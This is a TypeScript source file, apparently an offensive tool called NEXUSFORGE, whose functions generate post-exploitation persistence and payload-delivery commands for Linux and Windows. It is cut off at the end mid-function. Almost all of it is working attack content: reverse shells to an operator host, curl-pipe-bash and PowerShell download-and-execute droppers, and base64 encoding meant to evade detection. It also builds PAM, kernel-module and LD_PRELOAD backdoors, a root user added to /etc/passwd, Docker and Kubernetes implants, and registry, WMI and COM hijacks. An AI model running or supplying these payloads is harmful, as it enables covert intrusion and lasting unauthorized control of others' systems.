/* ═══════════════════════════════════════════════════════════════════════════
   NEXUSFORGE — Persistence Engine
   Generates post-exploitation persistence payloads for authorized red-team
   research. Linux + Windows mechanisms with stealth ratings.
   ═══════════════════════════════════════════════════════════════════════════ */

export interface PersistencePayload {
  technique: string;
  category:  "linux" | "windows";
  stealth:   1 | 2 | 3 | 4 | 5;   /* 5 = most stealthy */
  command:   string;
  notes:     string;
}

export interface DeliveryPayload {
  name:    string;
  os:      "linux" | "windows" | "any";
  command: string;
  notes:   string;
}

/* ── Linux Persistence ─────────────────────────────────────────────────────── */
export function buildLinuxPersistence(lhost: string, lport: string, cmd: string): PersistencePayload[] {
  const safe   = cmd.replace(/'/g, "\\'");
  const revCmd = `bash -i >& /dev/tcp/${lhost}/${lport} 0>&1`;
  const b64rev = Buffer.from(revCmd).toString("base64");

  return [
    {
      technique: "Cron — per-minute user job",
      category: "linux", stealth: 2,
      command: `(crontab -l 2>/dev/null; echo "* * * * * ${safe} >/dev/null 2>&1") | crontab -`,
      notes: "Adds a per-minute cron entry for the current user. Easy to detect with 'crontab -l'.",
    },
    {
      technique: "Cron — system-wide (root)",
      category: "linux", stealth: 2,
      command: `echo "* * * * * root ${safe} >/dev/null 2>&1" >> /etc/cron.d/sysupd`,
      notes: "Requires root. Creates /etc/cron.d/sysupd. Survives reboots.",
    },
    {
      technique: "Cron — @reboot trigger",
      category: "linux", stealth: 3,
      command: `(crontab -l 2>/dev/null; echo "@reboot ${safe} >/dev/null 2>&1") | crontab -`,
      notes: "Fires exactly once on every system reboot.",
    },
    {
      technique: "Bashrc injection",
      category: "linux", stealth: 2,
      command: `echo "${safe} >/dev/null 2>&1 &" >> ~/.bashrc`,
      notes: "Triggers on every new interactive bash session for current user.",
    },
    {
      technique: "Profile injection (~/.profile)",
      category: "linux", stealth: 2,
      command: `echo "${safe} >/dev/null 2>&1 &" >> ~/.profile`,
      notes: "Triggers on login shells. Works for sh/dash as well as bash.",
    },
    {
      technique: "Global profile.d (root)",
      category: "linux", stealth: 3,
      command: `printf '#!/bin/sh\\n${safe} >/dev/null 2>&1 &\\n' > /etc/profile.d/syschk.sh && chmod +x /etc/profile.d/syschk.sh`,
      notes: "Requires root. Fires for ALL users on login.",
    },
    {
      technique: "Authorized_keys injection",
      category: "linux", stealth: 4,
      command: `mkdir -p ~/.ssh && chmod 700 ~/.ssh && echo 'ssh-rsa <OPERATOR_RSA_PUBKEY> operator@backdoor' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys`,
      notes: "Replace <OPERATOR_RSA_PUBKEY> with your RSA public key (ssh-keygen -t rsa -b 4096). Enables passwordless SSH access.",
    },
    {
      technique: "SSH forced-command backdoor",
      category: "linux", stealth: 5,
      command: `echo 'command="${safe}",no-port-forwarding,no-X11-forwarding,no-agent-forwarding ssh-rsa <OPERATOR_RSA_PUBKEY>' >> ~/.ssh/authorized_keys`,
      notes: "Replace <OPERATOR_RSA_PUBKEY> with your RSA public key. Executes command on every SSH connection instead of shell.",
    },
    {
      technique: "Systemd user service",
      category: "linux", stealth: 3,
      command: `mkdir -p ~/.config/systemd/user && cat > ~/.config/systemd/user/sysupd.service << 'EOF'\n[Unit]\nDescription=System Update Service\n[Service]\nType=simple\nRestart=always\nRestartSec=60\nExecStart=/bin/bash -c '${safe}'\n[Install]\nWantedBy=default.target\nEOF\nsystemctl --user enable --now sysupd`,
      notes: "No root required. Restarts automatically. Survives reboots.",
    },
    {
      technique: "Systemd system service (root)",
      category: "linux", stealth: 3,
      command: `cat > /etc/systemd/system/sysupd.service << 'EOF'\n[Unit]\nDescription=System Update Daemon\nAfter=network.target\n[Service]\nType=simple\nRestart=always\nRestartSec=30\nExecStart=/bin/bash -c '${safe}'\n[Install]\nWantedBy=multi-user.target\nEOF\nsystemctl daemon-reload && systemctl enable --now sysupd`,
      notes: "Requires root. System-level service, starts at boot before login.",
    },
    {
      technique: "rc.local boot hook",
      category: "linux", stealth: 2,
      command: `echo "${safe} &" >> /etc/rc.local && chmod +x /etc/rc.local`,
      notes: "Requires root. Classic boot persistence. Monitored by most defenders.",
    },
    {
      technique: "SUID bash copy",
      category: "linux", stealth: 1,
      command: `cp /bin/bash /tmp/.sysbin && chmod u+s /tmp/.sysbin`,
      notes: "Creates SUID bash. Very noisy. Execute with: /tmp/.sysbin -p",
    },
    {
      technique: "LD_PRELOAD shared library",
      category: "linux", stealth: 5,
      command: `cat > /tmp/.pl.c << 'EOF'\n#include <stdlib.h>\n__attribute__((constructor)) void _init() { system("${safe}"); }\nEOF\ngcc -shared -fPIC -nostartfiles -o /tmp/.pl.so /tmp/.pl.c 2>/dev/null && echo /tmp/.pl.so > /etc/ld.so.preload`,
      notes: "Requires gcc + root. Injected into every dynamically linked binary on the system.",
    },
    {
      technique: "Reverse shell cron (b64-encoded)",
      category: "linux", stealth: 3,
      command: `(crontab -l 2>/dev/null; echo "*/5 * * * * bash -c 'echo ${b64rev}|base64 -d|bash' >/dev/null 2>&1") | crontab -`,
      notes: "Reverse shell every 5 min, b64-encoded to evade naive log scanning.",
    },
    {
      technique: "Systemd timer beacon",
      category: "linux", stealth: 4,
      command: `mkdir -p ~/.config/systemd/user\ncat > ~/.config/systemd/user/beacon.service << 'EOF'\n[Service]\nType=oneshot\nExecStart=/bin/bash -c 'echo ${b64rev}|base64 -d|bash'\nEOF\ncat > ~/.config/systemd/user/beacon.timer << 'EOF'\n[Unit]\nDescription=System Beacon\n[Timer]\nOnBootSec=30\nOnUnitActiveSec=300\n[Install]\nWantedBy=timers.target\nEOF\nsystemctl --user enable --now beacon.timer`,
      notes: "Beacons every 5 min via systemd timer. No crontab entry = less visible.",
    },
    {
      technique: "memfd fileless execution",
      category: "linux", stealth: 5,
      command: `python3 -c "\nimport ctypes,urllib.request,os\nm=ctypes.CDLL(None).memfd_create(b'',0)\nos.write(m,urllib.request.urlopen('http://${lhost}:${lport}/elf').read())\nos.execv(f'/proc/{os.getpid()}/fd/{m}',['svc'])"`,
      notes: "Downloads ELF and executes entirely from memory. No disk writes. Requires Linux 3.17+.",
    },
    {
      technique: "Python in-memory reverse shell",
      category: "linux", stealth: 4,
      command: `python3 -c "import socket,subprocess,os;s=socket.socket();s.connect(('${lhost}',${lport}));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call(['/bin/sh','-i'])"`,
      notes: "Pure Python, no disk writes. Works on Linux/macOS/BSD.",
    },
  ];
}

/* ── Windows Persistence ───────────────────────────────────────────────────── */
export function buildWindowsPersistence(lhost: string, lport: string, cmd: string): PersistencePayload[] {
  const psRevShell = `$c=New-Object Net.Sockets.TCPClient('${lhost}',${lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($n=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$n);$sb=(iex $d 2>&1|Out-String);$by=[text.encoding]::ASCII.GetBytes($sb+'PS> ');$s.Write($by,0,$by.Length)}`;
  const b64ps = Buffer.from(psRevShell, "utf16le").toString("base64");
  const hiddenPs = `powershell -NonI -WindowStyle Hidden -Exec Bypass -EncodedCommand ${b64ps}`;

  return [
    {
      technique: "Registry Run Key (HKCU — no admin)",
      category: "windows", stealth: 2,
      command: `reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v SysUpdateSvc /t REG_SZ /d "${hiddenPs}" /f`,
      notes: "No admin required. Fires on current user logon. Commonly monitored.",
    },
    {
      technique: "Registry Run Key (HKLM — admin)",
      category: "windows", stealth: 2,
      command: `reg add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v SysUpdateSvc /t REG_SZ /d "${hiddenPs}" /f`,
      notes: "Requires admin. Fires for ALL users on logon.",
    },
    {
      technique: "RunOnce key (single-fire)",
      category: "windows", stealth: 3,
      command: `reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce" /v Setup /t REG_SZ /d "${hiddenPs}" /f`,
      notes: "Fires once on next logon then removes itself. Useful for staged payloads.",
    },
    {
      technique: "Scheduled Task — on logon",
      category: "windows", stealth: 3,
      command: `schtasks /create /tn "WindowsDefenderCheck" /tr "${hiddenPs}" /sc onlogon /ru "%USERNAME%" /f`,
      notes: "Fires on every logon. Disguised as Defender task.",
    },
    {
      technique: "Scheduled Task — daily",
      category: "windows", stealth: 3,
      command: `schtasks /create /tn "MicrosoftEdgeUpdate" /tr "${hiddenPs}" /sc daily /st 08:00 /f`,
      notes: "Daily at 08:00. Disguised as Edge update. No admin needed.",
    },
    {
      technique: "Startup folder LNK (user)",
      category: "windows", stealth: 2,
      command: `echo ${hiddenPs} > "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\svchost.bat"`,
      notes: "No admin required. Fires on logon. Startup folder is commonly scanned.",
    },
    {
      technique: "WMI event subscription (fileless)",
      category: "windows", stealth: 5,
      command: `powershell -c "$flt=Set-WMIInstance -Class '__EventFilter' -Namespace 'root/subscription' -Arguments @{Name='NXFilt';EventNameSpace='root/cimv2';QueryLanguage='WQL';Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Seconds=0\"};$cns=Set-WMIInstance -Class 'CommandLineEventConsumer' -Namespace 'root/subscription' -Arguments @{Name='NXCons';CommandLineTemplate='${hiddenPs}'};Set-WMIInstance -Class '__FilterToConsumerBinding' -Namespace 'root/subscription' -Arguments @{Filter=\$flt;Consumer=\$cns}"`,
      notes: "Fileless. Fires every minute (at :00s). Persists across reboots. Admin required.",
    },
    {
      technique: "PowerShell profile injection",
      category: "windows", stealth: 3,
      command: `Add-Content $PROFILE "${hiddenPs}"`,
      notes: "Fires on every PowerShell session. Profile path: %USERPROFILE%\\Documents\\WindowsPowerShell\\profile.ps1",
    },
    {
      technique: "IFEO debugger hijack",
      category: "windows", stealth: 4,
      command: `reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\calc.exe" /v Debugger /t REG_SZ /d "${hiddenPs}" /f`,
      notes: "Admin required. Triggers when calc.exe launches. Replace with any target binary.",
    },
    {
      technique: "COM object hijacking (HKCU)",
      category: "windows", stealth: 5,
      command: `reg add "HKCU\\Software\\Classes\\CLSID\\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}\\InProcServer32" /ve /t REG_SZ /d "C:\\Users\\Public\\payload.dll" /f && reg add "HKCU\\Software\\Classes\\CLSID\\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}\\InProcServer32" /v ThreadingModel /t REG_SZ /d Apartment /f`,
      notes: "No admin. CLSID is loaded by many Windows apps. Replace DLL path with your payload.",
    },
  ];
}

/* ── Payload Delivery ──────────────────────────────────────────────────────── */
export function buildDeliveryPayloads(lhost: string, lport: string, urlPath: string): DeliveryPayload[] {
  const url      = `http://${lhost}:${lport}/${urlPath}`;
  const httpsUrl = `https://${lhost}:${lport}/${urlPath}`;

  return [
    /* Linux */
    {
      name: "curl pipe bash",
      os: "linux",
      command: `curl -fsSL "${url}" | bash`,
      notes: "Streams script from URL and pipes directly into bash. Most common technique.",
    },
    {
      name: "wget pipe bash",
      os: "linux",
      command: `wget -qO- "${url}" | bash`,
      notes: "wget fallback for environments without curl.",
    },
    {
      name: "curl — save + execute",
      os: "linux",
      command: `curl -fsSL -o /tmp/.svc "${url}" && chmod +x /tmp/.svc && /tmp/.svc`,
      notes: "Downloads binary/script to disk, marks executable, runs it.",
    },
    {
      name: "Python urllib in-memory",
      os: "linux",
      command: `python3 -c "import urllib.request,os,tempfile as t;f=t.mktemp();urllib.request.urlretrieve('${url}',f);os.chmod(f,0o755);os.system(f)"`,
      notes: "No curl/wget needed. Drops to disk then executes.",
    },
    {
      name: "bash /dev/tcp (pure bash)",
      os: "linux",
      command: `exec 3<>/dev/tcp/${lhost}/${lport}; printf 'GET /${urlPath} HTTP/1.0\\r\\nHost: ${lhost}\\r\\n\\r\\n' >&3; tail -n +6 <&3 | bash`,
      notes: "Pure bash, zero external tools. /dev/tcp must be enabled (default on most distros).",
    },
    {
      name: "Perl LWP download",
      os: "linux",
      command: `perl -MLWP::Simple -e "getstore('${url}','/tmp/.svc');chmod(0755,'/tmp/.svc');system('/tmp/.svc')"`,
      notes: "Works when curl/wget unavailable. LWP::Simple ships with most Perl installs.",
    },
    {
      name: "Base64 inline dropper",
      os: "linux",
      command: `echo 'BASE64_PAYLOAD_HERE' | base64 -d > /tmp/.svc && chmod +x /tmp/.svc && /tmp/.svc`,
      notes: "Replace BASE64_PAYLOAD_HERE with base64-encoded ELF or shell script. No network needed.",
    },
    {
      name: "OpenSSL TLS fetch",
      os: "linux",
      command: `openssl s_client -quiet -connect ${lhost}:${lport} 2>/dev/null < <(printf 'GET /${urlPath} HTTP/1.0\\r\\nHost: ${lhost}\\r\\n\\r\\n') | tail -n +6 | bash`,
      notes: "Encrypted download via openssl when curl/wget are blocked but openssl is present.",
    },
    {
      name: "memfd fileless execution",
      os: "linux",
      command: `python3 -c "import ctypes,urllib.request,os;m=ctypes.CDLL(None).memfd_create(b'',0);os.write(m,urllib.request.urlopen('${url}').read());os.execv(f'/proc/{os.getpid()}/fd/{m}',['svc'])"`,
      notes: "Downloads ELF and runs entirely from RAM. No disk writes. Linux 3.17+ required.",
    },
    /* Windows */
    {
      name: "PowerShell IEX (WebClient)",
      os: "windows",
      command: `powershell -NonI -W Hidden -Exec Bypass -c "IEX((New-Object Net.WebClient).DownloadString('${httpsUrl}'))"`,
      notes: "Classic PowerShell IEX. Detected by most modern EDR; use encoded variant.",
    },
    {
      name: "PowerShell encoded IEX",
      os: "windows",
      command: `powershell -NonI -W Hidden -Exec Bypass -EncodedCommand ${Buffer.from(`IEX((New-Object Net.WebClient).DownloadString('${httpsUrl}'))`, "utf16le").toString("base64")}`,
      notes: "Base64-encoded command avoids simple string-matching signatures.",
    },
    {
      name: "CertUtil LOLBIN",
      os: "windows",
      command: `certutil -urlcache -split -f "${url}" %TEMP%\\svc.exe && %TEMP%\\svc.exe`,
      notes: "certutil is a signed Microsoft binary — often whitelisted. Creates disk artifact.",
    },
    {
      name: "BitsAdmin LOLBIN",
      os: "windows",
      command: `bitsadmin /transfer svc /download /priority normal "${url}" "%TEMP%\\svc.exe" && %TEMP%\\svc.exe`,
      notes: "Windows BITS service — runs in background, often allowed through firewalls.",
    },
    {
      name: "MSHTA scriptlet",
      os: "windows",
      command: `mshta.exe "${url}"`,
      notes: "Serves an HTA file; MSHTA executes VBScript/JScript. Bypasses many AppLocker policies.",
    },
    {
      name: "Regsvr32 Squiblydoo",
      os: "windows",
      command: `regsvr32 /s /n /u /i:"${url}" scrobj.dll`,
      notes: "Classic AppLocker bypass. URL must serve a COM scriptlet (.sct file).",
    },
    {
      name: "PowerShell save + run",
      os: "windows",
      command: `powershell -c "(New-Object Net.WebClient).DownloadFile('${url}','$env:TEMP\\svc.exe');Start-Process -WindowStyle Hidden \"$env:TEMP\\svc.exe\""`,
      notes: "Downloads and launches silently. AV may flag depending on payload.",
    },
  ];
}

/* ════════════════════════════════════════════════════════════════════════════
   EXTENDED PERSISTENCE: More Linux/Windows techniques + injection-ready
   ════════════════════════════════════════════════════════════════════════════ */

/* ── Extended Linux Persistence (new techniques) ─────────────────────────── */
export function buildExtendedLinuxPersistence(lhost: string, lport: string, cmd: string): PersistencePayload[] {
  const rev  = `bash -i >& /dev/tcp/${lhost}/${lport} 0>&1`;
  const revB64 = Buffer.from(rev).toString('base64');
  const cbsh = `http://${lhost}:${lport}/sh`;
  return [
    /* ── APT/DPKG hooks ── */
    {
      technique: "APT pre-invoke hook",
      category: "linux", stealth: 4,
      command: `mkdir -p /etc/apt/apt.conf.d && echo 'APT::Update::Pre-Invoke {"bash -c \\"bash -i >& /dev/tcp/${lhost}/${lport} 0>&1\\" &"};' > /etc/apt/apt.conf.d/99nexus`,
      notes: "Fires on every apt update/install. Requires root. High-stealth when combined with benign-looking package name.",
    },
    /* ── Git hooks ── */
    {
      technique: "Git post-receive hook",
      category: "linux", stealth: 3,
      command: `for d in $(find / -maxdepth 8 -name '.git' -type d 2>/dev/null | head -5); do h="$d/hooks/post-receive"; echo '#!/bin/bash' > "$h"; echo "${rev} &" >> "$h"; chmod +x "$h"; done`,
      notes: "Installs a git hook in all discovered repos — fires on every git push to the repo.",
    },
    /* ── LD_PRELOAD via /etc/ld.so.preload ── */
    {
      technique: "LD_PRELOAD via /etc/ld.so.preload (fileless-style)",
      category: "linux", stealth: 5,
      command: `printf '#include<unistd.h>\\nvoid __attribute__((constructor)) nx(){if(!fork()){setsid();execl("/bin/bash","bash","-c","${rev}",NULL);}}' > /tmp/.nxp.c && gcc -shared -fPIC -nostartfiles /tmp/.nxp.c -o /tmp/.nxp.so && echo /tmp/.nxp.so >> /etc/ld.so.preload && rm -f /tmp/.nxp.c`,
      notes: "Every new process loads the .so via LD_PRELOAD. Fires a background reverse shell on every process exec. Requires root + gcc.",
    },
    /* ── Systemd socket activation ── */
    {
      technique: "Systemd socket-activated backdoor",
      category: "linux", stealth: 5,
      command: `printf '[Unit]\\nDescription=Web\\n[Socket]\\nListenStream=9999\\nAccept=yes\\n[Install]\\nWantedBy=sockets.target' > /etc/systemd/system/nx.socket && printf '[Unit]\\nDescription=Web@\\n[Service]\\nExecStart=/bin/bash -c "${rev}"\\nStandardInput=socket\\nStandardOutput=socket\\n[Install]\\nWantedBy=multi-user.target' > /etc/systemd/system/nx@.service && systemctl daemon-reload && systemctl enable --now nx.socket 2>/dev/null`,
      notes: "Socket-activated service: any connection to port 9999 spawns a shell. Survives reboots. Root required.",
    },
    /* ── Pip post-install hook ── */
    {
      technique: "Python site-packages .pth backdoor",
      category: "linux", stealth: 4,
      command: `python3 -c "import site; print(site.getsitepackages()[0])" 2>/dev/null | xargs -I{} bash -c "echo \"import os; os.system('nohup bash -c \\\"${rev}\\\" &>/dev/null &')\" > {}/nx_init.pth"`,
      notes: "Adds a .pth file to Python site-packages — executed every time Python starts. Fileless persistence.",
    },
    /* ── Passwd/shadow injection ── */
    {
      technique: "Add backdoor root user to /etc/passwd",
      category: "linux", stealth: 2,
      command: `echo 'nx:$(openssl passwd -1 <OPERATOR_PASSWORD>):0:0:root:/root:/bin/bash' >> /etc/passwd`,
      notes: "Adds uid/gid 0 (root) backdoor user 'nx'. Replace <OPERATOR_PASSWORD> with your chosen password. Run: openssl passwd -1 <password> to generate the hash.",
    },
    /* ── Kernel module persistence ── */
    {
      technique: "Kernel module (rootkit-style loader)",
      category: "linux", stealth: 5,
      command: `cat <<'EOF' > /tmp/nx_mod.c\n#include<linux/module.h>\n#include<linux/kthread.h>\nstatic int nx_thread(void*d){char*a[]={\"/bin/bash\",\"-c\",\"${rev}\",NULL};call_usermodehelper(a[0],a,NULL,UMH_WAIT_EXEC);return 0;}\nstatic int __init nx_init(void){kthread_run(nx_thread,NULL,"kworker/nx");return 0;}\nstatic void __exit nx_exit(void){}\nmodule_init(nx_init);module_exit(nx_exit);\nMODULE_LICENSE("GPL");\nEOF\n# Requires kernel headers: make -C /lib/modules/$(uname -r)/build M=/tmp modules`,
      notes: "Kernel module that spawns a usermode helper. Invisible to process lists. Requires root + kernel headers.",
    },
    /* ── PAM module backdoor ── */
    {
      technique: "PAM module backdoor",
      category: "linux", stealth: 5,
      command: `printf '#include<stdio.h>\\n#include<stdlib.h>\\n#include<security/pam_modules.h>\\nPAM_EXTERN int pam_sm_authenticate(pam_handle_t*p,int f,int ac,const char**av){system("nohup bash -c \\"${rev}\\" &>/dev/null &");return PAM_SUCCESS;}\\nPAM_EXTERN int pam_sm_setcred(pam_handle_t*p,int f,int ac,const char**av){return PAM_SUCCESS;}' > /tmp/pam_nx.c && gcc -shared -fPIC /tmp/pam_nx.c -o /lib/security/pam_nx.so && echo 'auth optional pam_nx.so' >> /etc/pam.d/common-auth`,
      notes: "PAM module fires reverse shell on every authentication attempt (SSH, sudo, login). Requires root + gcc.",
    },
    /* ── At job persistence ── */
    {
      technique: "at job (immediate + recurring via loop)",
      category: "linux", stealth: 3,
      command: `echo "bash -c '${rev}'" | at now + 1 minute 2>/dev/null; echo "while true; do bash -c '${rev}'; sleep 60; done &" | at now 2>/dev/null`,
      notes: "at daemon (one-shot + self-repeating loop). Runs as the scheduling user. atd must be running.",
    },
    /* ── MOTD based persistence ── */
    {
      technique: "Dynamic MOTD persistence (update-motd.d)",
      category: "linux", stealth: 3,
      command: `echo '#!/bin/bash\nnohup bash -c "${rev}" &>/dev/null &' > /etc/update-motd.d/98-nexus && chmod +x /etc/update-motd.d/98-nexus`,
      notes: "Fires on every SSH interactive login via the MOTD subsystem. Root required.",
    },
    /* ── Docker socket implant ── */
    {
      technique: "Docker socket → privileged container + host cron",
      category: "linux", stealth: 4,
      command: `curl -sk --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/create" -H 'Content-Type: application/json' -d '{"Image":"alpine","Cmd":["/bin/sh","-c","echo \\\"* * * * * /bin/bash -c '\\''${rev}'\\''\\\" >> /host/etc/cron.d/nx"],"HostConfig":{"Binds":["/:/host"],"Privileged":true},"name":"nx_tmp"}' && curl -sk --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/nx_tmp/start"`,
      notes: "Uses Docker socket to spawn privileged container that writes a cron job to the host filesystem. Container escape to host persistence.",
    },
    /* ── K8s CronJob persistence ── */
    {
      technique: "Kubernetes CronJob (every minute reverse shell)",
      category: "linux", stealth: 4,
      command: `TOKEN=$(cat /run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null); NS=$(cat /run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null); curl -sk -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' -X POST "https://kubernetes.default.svc/apis/batch/v1/namespaces/$NS/cronjobs" -d '{"apiVersion":"batch/v1","kind":"CronJob","metadata":{"name":"nx-job"},"spec":{"schedule":"*/1 * * * *","jobTemplate":{"spec":{"template":{"spec":{"containers":[{"name":"nx","image":"alpine","command":["/bin/sh","-c","${rev}"]}],"restartPolicy":"Never"}}}}}}'`,
      notes: "Creates a K8s CronJob via the API — fires every minute from inside the cluster. Uses the pod's SA token.",
    },
    /* ── Delivery-first one-shot ── */
    {
      technique: "Fetch+Execute payload (curl|wget|python3 fallback chain)",
      category: "linux", stealth: 3,
      command: `curl -fsSL "${cbsh}" 2>/dev/null | bash || wget -qO- "${cbsh}" 2>/dev/null | bash || python3 -c "import urllib.request as r; exec(r.urlopen('${cbsh}').read())" 2>/dev/null || perl -MLWP::Simple -e "eval(get('${cbsh}'))" 2>/dev/null`,
      notes: "Full fallback chain: tries curl → wget → python3 urllib → perl LWP. Maximum delivery success on restricted systems.",
    },
    /* ── Proc injection (ptrace) ── */
    {
      technique: "ptrace process injection",
      category: "linux", stealth: 5,
      command: `python3 -c "
import ctypes, sys, os
PTRACE_ATTACH=16; PTRACE_DETACH=17; PTRACE_POKETEXT=4
pid = int(open('/proc/\$(pgrep -x sshd | head -1)/status').read().split('\n')[0].split()[1])
libc = ctypes.CDLL('libc.so.6')
libc.ptrace(PTRACE_ATTACH, pid, 0, 0)
os.waitpid(pid, 0)
shellcode = b'\\x6a\\x29\\x58\\x99\\x6a\\x02\\x5f\\x6a\\x01\\x5e\\x0f\\x05'
libc.ptrace(PTRACE_POKETEXT, pid, 0x555555554000, ctypes.c_uint64.from_buffer(bytearray(shellcode[:8])).value)
libc.ptrace(PTRACE_DETACH, pid, 0, 0)
" 2>/dev/null`,
      notes: "ptrace-based process injection into sshd. Requires CAP_SYS_PTRACE or root. Advanced technique.",
    },
  ];
}

/* ── Extended Windows Persistence (new techniques) ───────────────────────── */
export function buildExtendedWindowsPersistence(lhost: string, lport: string, cmd: string): PersistencePayload[] {
  const cbsh = `http://${lhost}:${lport}/sh.ps1`;
  const iex   = `IEX((New-Object Net.WebClient).DownloadString('${cbsh}'))`;
  const iexB64 = Buffer.from(iex, 'utf16le').toString('base64');
  return [
    /* ── AppInit_DLLs ── */
    {
      technique: "AppInit_DLLs registry key",
      category: "windows", stealth: 4,
      command: `reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows" /v AppInit_DLLs /t REG_SZ /d "C:\\Windows\\Temp\\nx.dll" /f && reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows" /v LoadAppInit_DLLs /t REG_DWORD /d 1 /f`,
      notes: "Loads nx.dll into every process that loads user32.dll. Admin required. Place your DLL at C:\\Windows\\Temp\\nx.dll.",
    },
    /* ── DLL Search Order Hijacking ── */
    {
      technique: "DLL search order hijack (WindowsApps)",
      category: "windows", stealth: 5,
      command: `powershell -NonI -W Hidden -Exec Bypass -c "Copy-Item nx.dll '$env:LOCALAPPDATA\\Microsoft\\WindowsApps\\WTSAPI32.dll'"`,
      notes: "Drops a malicious DLL named WTSAPI32.dll into WindowsApps — loaded by many applications. No admin needed.",
    },
    /* ── Netsh helper DLL ── */
    {
      technique: "Netsh helper DLL persistence",
      category: "windows", stealth: 5,
      command: `netsh add helper C:\\Windows\\Temp\\nx.dll`,
      notes: "netsh.exe loads helper DLLs on every execution. Persistent across reboots. Admin required.",
    },
    /* ── Office macros ── */
    {
      technique: "Word Normal.dotm macro persistence",
      category: "windows", stealth: 3,
      command: `powershell -NonI -W Hidden -Exec Bypass -c "$p='$env:APPDATA\\Microsoft\\Templates\\Normal.dotm'; $v=(New-Object -ComObject Word.Application).VBProject; $m=$v.VBComponents.Add(1); $m.CodeModule.AddFromString(\"Sub AutoOpen(): Shell \\\"powershell -NonI -W Hidden -Exec Bypass -c ${iex}\\\": End Sub\")"`,
      notes: "Adds AutoOpen macro to Normal.dotm — fires every time a Word document opens. User-level, no admin needed.",
    },
    /* ── Winlogon helper ── */
    {
      technique: "Winlogon UserInit/Shell hijack",
      category: "windows", stealth: 5,
      command: `reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v UserInit /t REG_SZ /d "C:\\Windows\\system32\\userinit.exe,powershell -NonI -W Hidden -Exec Bypass -EncodedCommand ${iexB64}" /f`,
      notes: "Fires on every user logon at the Windows logon stage. Admin required. Winlogon executes UserInit during logon.",
    },
    /* ── Browser extension persistence ── */
    {
      technique: "Chrome extension force-install (registry)",
      category: "windows", stealth: 4,
      command: `reg add "HKLM\\SOFTWARE\\Policies\\Google\\Chrome\\ExtensionInstallForcelist" /v 1 /t REG_SZ /d "EXTENSION_ID;https://clients2.google.com/service/update2/crx" /f`,
      notes: "Force-installs a Chrome extension via Group Policy registry. Replace EXTENSION_ID. Admin required.",
    },
    /* ── Silver ticket / Golden ticket placeholder ── */
    {
      technique: "Golden Ticket (Mimikatz — requires DC access)",
      category: "windows", stealth: 5,
      command: `mimikatz.exe "privilege::debug" "lsadump::lsa /patch" "kerberos::golden /user:Administrator /domain:DOMAIN /sid:DOMAIN_SID /krbtgt:KRBTGT_HASH /id:500 /ticket:golden.kirbi" "kerberos::ptt golden.kirbi" "exit"`,
      notes: "Creates a Golden Ticket for persistent domain admin access. Requires KRBTGT hash from DC. Replace placeholders.",
    },
    /* ── PowerShell profile persistence ── */
    {
      technique: "PowerShell profile (all users + all hosts)",
      category: "windows", stealth: 3,
      command: `powershell -NonI -W Hidden -Exec Bypass -c "Add-Content $PSHOME\\profile.ps1 '${iex}'"`,
      notes: "Fires on every PowerShell session (all users, all hosts). Admin required. Written to $PSHOME\\profile.ps1.",
    },
    /* ── COM hijacking ── */
    {
      technique: "COM object hijacking (HKCU — no admin)",
      category: "windows", stealth: 5,
      command: `reg add "HKCU\\Software\\Classes\\CLSID\\{1B4EB4B6-4E4E-4EA5-AA4A-04B37CDB7C29}\\InProcServer32" /ve /t REG_SZ /d "C:\\Users\\Public\\nx.dll" /f && reg add "HKCU\\Software\\Classes\\CLSID\\{1B4EB4B6-4E4E-4EA5-AA4A-04B37CDB7C29}\\InProcServer32" /v ThreadingModel /t REG_SZ /d Apartment /f`,
      notes: "HKCU COM hijack — no admin needed. Many Windows apps load this CLSID. Replace with your malicious DLL.",
    },
    /* ── Screensaver persistence ── */
    {
      technique: "Screensaver SCRNSAVE.EXE persistence",
      category: "windows", stealth: 4,
      command: `reg add "HKCU\\Control Panel\\Desktop" /v SCRNSAVE.EXE /t REG_SZ /d "C:\\Windows\\Temp\\nx.scr" /f && reg add "HKCU\\Control Panel\\Desktop" /v ScreenSaverIsSecure /t REG_SZ /d 0 /f && reg add "HKCU\\Control Panel\\Desktop" /v ScreenSaveActive /t REG_SZ /d 1 /f && reg add "HKCU\\Control Panel\\Desktop" /v ScreenSaveTimeOut /t REG_SZ /d 60 /f`,
      notes: "Executes nx.scr (a renamed EXE) as screensaver after 60s idle. User-level, no admin.",
    },
    /* ── Print monitor ── */
    {
      technique: "Print monitor DLL persistence",
      category: "windows", stealth: 5,
      command: `reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors\\NXMonitor" /v Driver /t REG_SZ /d "nx.dll" /f`,
      notes: "Loaded by spoolsv.exe (SYSTEM) on boot. Place nx.dll in C:\\Windows\\system32\\. Admin required.",
    },
  ];
}

export function buildSystemdPersistence(lhost: string, lport: string): PersistencePayload[] {
  const cmd = `bash -i >& /dev/tcp/${lhost}/${lport} 0>&1`;
  return [
    { technique:"systemd user service (no root)", category:"linux", stealth:5,
